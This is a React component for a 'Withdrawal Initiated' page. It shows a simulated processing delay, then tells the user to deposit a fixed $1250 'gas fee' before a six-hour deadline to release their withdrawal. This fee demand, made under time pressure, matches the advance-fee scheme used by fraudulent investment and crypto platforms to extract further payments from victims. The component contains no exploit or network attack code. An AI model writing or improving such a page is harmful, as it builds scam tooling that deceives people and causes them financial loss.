import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const location = useLocation();
  const state = location.state || {};
  const method = state.method || "Not specified";
  const amount = state.amount || 0;
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  const deadline = new Date(Date.now() + 6 * 60 * 60 * 1000).toLocaleString();

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-r from-indigo-600 to-purple-700 text-white">
      {loading ? (
        <p className="text-2xl font-semibold animate-pulse">
          Processing withdrawal...
        </p>
      ) : (
        <div className="bg-white text-gray-800 rounded-lg shadow-lg p-10 max-w-2xl w-full">
          <h1 className="text-3xl font-bold mb-6 text-center text-indigo-700">
            Withdrawal Initiated
          </h1>

          <div className="space-y-4 text-lg">
            <p>
              <strong>Method:</strong> {method}
            </p>
            <p>
              <strong>Amount:</strong> ${amount}
            </p>
            <p className="mt-6 text-red-600 font-semibold text-center">
              Instruction: Please deposit <strong>$1250</strong> as a gas fee
              into your account before <strong>{deadline}</strong> to complete
              the withdrawal.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
